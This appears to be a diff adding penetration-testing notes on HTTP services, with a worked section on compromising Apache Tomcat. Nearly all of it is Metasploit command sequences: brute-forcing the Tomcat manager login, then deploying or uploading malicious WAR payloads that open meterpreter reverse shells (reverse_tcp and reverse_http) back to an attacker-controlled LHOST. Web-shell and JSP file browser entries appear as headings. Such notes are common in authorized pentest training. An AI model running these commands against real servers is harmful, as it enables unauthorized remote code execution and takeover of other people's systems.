@@ -1,0 +1,53 @@
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+	HTTP
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+1.[Webmin]
+2.[Jenkins]
+3.[Apache Tomcat]
+4.[JBoss]
+5.[Lotus Domino httpd]
+6.[IIS]
+7.[VMware ESXi]
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+[Pratique]: Apache Tomcat
+
+"Upload, deploy malicious payloads into the application and run it"
+
+1.Tomcat Application Manager Login Utility
+msf5 > use auxiliary/scanner/http/tomcat_mgr_login
+msf5 auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS @IP
+msf5 auxiliary(scanner/http/tomcat_mgr_login) > exploit
+
+2.Apache Tomcat Manager Application Deployer Authenticated Code Execution
+msf5 > use exploit/multi/http/tomcat_mgr_deploy
+msf5 exploit(multi/http/tomcat_mgr_deploy) > set RHOSTS @IP
+msf5 exploit(multi/http/tomcat_mgr_deploy) > set FingerprintCheck false
+msf5 exploit(multi/http/tomcat_mgr_deploy) > show payloads
+msf5 exploit(multi/http/tomcat_mgr_deploy) > set payload java/meterpreter/reverse_tcp
+msf5 exploit(multi/http/tomcat_mgr_deploy) > exploit
+
+3.Apache Tomcat Manager Authenticated Upload Code Execution
+msf5 > use exploit/multi/http/tomcat_mgr_upload
+msf5 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS @IP
+msf5 exploit(multi/http/tomcat_mgr_upload) > show payloads
+msf5 exploit(multi/http/tomcat_mgr_upload) > set payload java/meterpreter/reverse_http
+msf5 exploit(multi/http/tomcat_mgr_upload) > set LHOST @IP_HOST
+msf5 exploit(multi/http/tomcat_mgr_upload) > exploit
+
+4. Web-Shell
+
+5.Jsp File Browser
+
+
+
+
+
+
+
+
+
+
+
+
